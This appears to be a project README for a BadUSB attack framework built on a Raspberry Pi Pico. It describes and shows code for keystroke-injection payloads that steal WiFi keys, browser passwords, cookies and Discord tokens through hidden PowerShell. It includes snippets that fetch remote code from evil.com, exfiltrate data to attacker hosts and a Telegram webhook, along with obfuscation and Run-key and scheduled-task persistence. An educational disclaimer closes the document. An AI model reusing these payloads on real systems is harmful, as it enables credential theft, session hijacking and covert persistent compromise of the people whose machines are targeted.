# ⚡ BadUSB Attack Framework with Raspberry Pi Pico

## 🎯 Project Overview

This project demonstrates the implementation of a **BadUSB attack platform** using a **Raspberry Pi Pico** microcontroller. By emulating a **USB HID (Human Interface Device) keyboard**, the Pico can execute automated keystroke injection attacks on target systems, bypassing traditional security measures that focus on file-based malware.

### Project Goals

- **Develop** a functional BadUSB attack framework
- **Implement** keyboard injection payloads for Windows systems
- **Master** USB HID protocol and device emulation
- **Create** data exfiltration mechanisms
- **Understand** low-level hardware attack vectors

### Key Features

✅ **USB HID emulation** - Acts as a legitimate keyboard device  
✅ **Automated payload execution** - Scripts run on device connection  
✅ **Stealthy operation** - Hidden PowerShell execution  
✅ **Data exfiltration** - Automatic storage on the Pico  
✅ **AZERTY layout support** - French keyboard compatibility

---

## 🔧 Technical Architecture

### Hardware Requirements

- **1x Raspberry Pi Pico** (~$5) - RP2040 microcontroller
- **1x USB Cable** (micro-USB to USB-A)
- **Target PC** - Windows 10/11 for testing

### Technology Stack

- **CircuitPython 8.2+** - Python firmware for microcontrollers
- **Adafruit HID Library** - USB keyboard/mouse emulation
- **Custom AZERTY layout** - `keyboard_layout_win_fr.mpy`
- **PowerShell** - Payload execution engine on Windows

### Attack Mechanism

The Raspberry Pi Pico exploits the **USB HID protocol** to masquerade as a trusted keyboard device. When connected to a target system:

1. **Device enumeration** - OS recognizes it as a standard keyboard
2. **Keystroke injection** - Automated typing at ~100 characters/second
3. **Command execution** - Opens PowerShell/CMD with elevated privileges
4. **Payload deployment** - Executes malicious scripts in memory
5. **Data exfiltration** - Copies sensitive data to the Pico's storage
6. **Trace removal** - Clears command history and logs (optional)

**Execution time**: 5-15 seconds depending on payload  
**Detection rate**: Near-zero without EDR/XDR solutions  
**Success rate**: ~95% on unprotected systems

---

## Payload Development

### 1. **Basic Keystroke Injection** 🔍
**File**: `pico_badusb_test_simple.py`

Foundational script to validate HID emulation and keyboard layout.

**Functionality**:
- Opens Notepad via Win+R
- Types test message with special characters
- Saves file to Desktop as `test_azerty.txt`
- Validates AZERTY layout mapping

**Execution time**: 10 seconds  
**Complexity**: Low

### 2. **System Reconnaissance Payload** 📊
**File**: `pico_badusb_exfiltration_basic.py`

Comprehensive system information gathering script.

**Data collected**:
- System information (OS version, CPU, RAM, disk space)
- Running processes and services
- Network configuration (IP, MAC, DNS, gateway)
- File system structure (Documents, Desktop, Downloads)
- WiFi passwords in plaintext (via `netsh wlan`)
- Chrome browser history and bookmarks

**Technical approach**:
```powershell
# PowerShell commands executed
systeminfo
Get-Process
ipconfig /all
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

**Execution time**: ~15 seconds  
**Exfiltration**: Pico storage (`CIRCUITPY/exfil/`) + Desktop copy

### 3. **Stealth Exfiltration** 👻 ⭐
**File**: `pico_badusb_exfiltration_hide.py`

**Completely invisible** data exfiltration using hidden PowerShell.

**Advanced features**:
- Hidden PowerShell window (`-WindowStyle Hidden`)
- No user interaction required
- Silent execution without visual indicators
- Screenshot capture using .NET libraries
- Cookie theft for session hijacking

**Data exfiltrated**:
- WiFi credentials
- **Chrome cookies** (enables session hijacking)
- Browser history (last 1000 entries)
- Complete file listing (Documents, Desktop, Downloads)
- Network configuration
- **Real-time screenshot** of active desktop

**Technical implementation**:
```powershell
powershell -WindowStyle Hidden -Command {
  # Screenshot capture
  Add-Type -AssemblyName System.Windows.Forms
  $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
  $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
  # Cookie extraction
  Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
}
```

**Execution time**: ~8 seconds  
**Detection**: Zero visual footprint

### 4. **Credential Harvesting** 💀 ⭐⭐
**File**: `pico_badusb_steal_credentials.py`

Most critical payload - complete credential database extraction.

**Targets**:
- **Chrome passwords** (Login Data SQLite database)
- **Edge passwords** (Login Data)
- **Firefox passwords** (logins.json + key4.db decryption)
- **Browser cookies** (session tokens)
- **Autofill data** (credit card information)
- **Discord tokens** (local storage)
- **Slack/Teams cookies** (workspace access)

**Technical approach**:
```powershell
# Chrome password database location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $chromePath -Destination "$env:TEMP\chrome_creds.db"

# Firefox credentials
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
Copy-Item "$firefoxPath\*.default-release\logins.json"
Copy-Item "$firefoxPath\*.default-release\key4.db"

# Discord tokens
$discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
```

**Execution time**: ~12 seconds  
**Impact**: CRITICAL - Full account compromise  
**Exfiltration**: Compressed ZIP archive on Pico + Desktop

---

## 🚀 Setup and Configuration

Initily, this is the youtube content who made me work on that : 

[Network Chuck - BadUSB Attack Framework - Raspberry Pi Pico](https://www.youtube.com/watch?v=e_f9p-_JWZw&t=106s&pp=ugMICgJmchABGAHKBRhyYXBiZXJyeSBwaSBwaWNvIGJhZCB1c2I%3D)

Factualy you have two way to developp your malware :

1. .dd file
The Adafruit Library initialy provide a system to understand .dd file, so you can just write your payload like that : 
```bash
GUI r
DELAY 500

STRING cmd
ENTER
DELAY 500

STRING netsh wlan show profiles
ENTER
DELAY 2000

STRING netsh wlan export profile folder=C:\ key=clear
ENTER
DELAY 3000

ALT F4
```

2. .py file 

But its not the only way to proceed. 
The code who transform your .dd file in action for the Raspberry Pico is written in Python here, so you can edit it and write your payload in python!

```python
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

def press_combo(*keys):
    """Appuie sur une combinaison de touches"""
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def press_enter():
    """Appuie sur Entrée"""
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.3)

time.sleep(2)

# Open Powershell
press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
layout.write("powershell -NoP -Exec Bypass")
press_enter()
time.sleep(1.5)
```

3. Powershell file execution
Or you can directly execute a powershell file located on the Pico throught python
```python
# Open Powershell
press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
layout.write("powershell -File C:\\payload.ps1")
press_enter()
time.sleep(1.5)
```
---

## 🔬 Advanced Techniques

### Evasion and Anti-Detection

**1. Timing-based evasion**
```python
# Random delays to avoid pattern detection
import random
time.sleep(random.uniform(1, 3))
```

**2. PowerShell obfuscation**
```powershell
# Base64 encoding
$command = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

### Data Exfiltration Methods

**1. Local storage (Pico)**
```python
# Write to Pico's internal storage
with open("/exfil/data.txt", "w") as f:
    f.write(exfiltrated_data)
```

**2. HTTP POST**
```powershell
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body $data
```

**3. Email exfiltration**
```powershell
Send-MailMessage -To "attacker@evil.com" -From "victim@company.com" -Subject "Data" -Body $secrets -SmtpServer "smtp.company.com"
```

**4. Webhook (Telegram or Discord)**
```powershell
Invoke-RestMethod -Uri "https://api.telegram.org/bot<token>/sendMessage" -Method Post -Body @{chat_id = "<chat_id>"; text = $data}
```

### Persistence Mechanisms

**1. Registry Run keys**
```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -File C:\payload.ps1"
```

**2. Scheduled tasks**
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger
```

---

## 💡 Skills Developed

### Technical Skills
- **Embedded programming** - CircuitPython on microcontrollers
- **USB HID emulation** - Low-level USB protocol implementation
- **PowerShell scripting** - Windows automation and exploitation
- **Data exfiltration** - Information gathering techniques
- **Reverse engineering** - Browser credential extraction
- **Payload obfuscation** - Anti-detection techniques

### Security Skills
- **Red Team operations** - Offensive security techniques
- **Physical attack vectors** - Hardware-based exploitation
- **Persistence mechanisms** - Maintaining system access
- **OPSEC** - Operational security and trace removal
- **Threat modeling** - Attack surface analysis

---

## 🔗 Resources and Documentation

### Technical Resources
- **CircuitPython** - [circuitpython.org](https://circuitpython.org/)
- **Adafruit HID** - [learn.adafruit.com](https://learn.adafruit.com/circuitpython-essentials/circuitpython-hid-keyboard-and-mouse)
- **Pico-Ducky** - [github.com/dbisu/pico-ducky](https://github.com/dbisu/pico-ducky)
- **USB HID Specification** - [usb.org](https://www.usb.org/hid)
- **PowerShell Documentation** - [docs.microsoft.com](https://docs.microsoft.com/powershell/)
- **Youtube Video** - [https://www.youtube.com/watch?v=e_f9p-_JWZw&t=106s&pp=ugMICgJmchABGAHKBRhyYXBiZXJyeSBwaSBwaWNvIGJhZCB1c2I%3D](https://www.youtube.com/watch?v=e_f9p-_JWZw&t=106s&pp=ugMICgJmchABGAHKBRhyYXBiZXJyeSBwaSBwaWNvIGJhZCB1c2I%3D)

> Script "07.stealer_password_browser_template.ps1" made by https://github.com/simplyyCarlos
---

## 🎓 Conclusion

This project demonstrates in a concrete and impactful way the risks associated with malicious USB devices. In just a few seconds, a simple 10€ Raspberry Pi Pico can completely compromise a system, steal credentials, install backdoors, or simulate ransomware.

**The goal is not to create malicious tools**, but to **raise awareness** among decision-makers and users about real cyber risks. A 15-minute demonstration can trigger awareness and unlock a cybersecurity budget that will protect the company for years to come.

---

**⚠️ Reminder**: This project is strictly educational. Any malicious use is illegal and unethical. Use this knowledge to protect, never to harm.
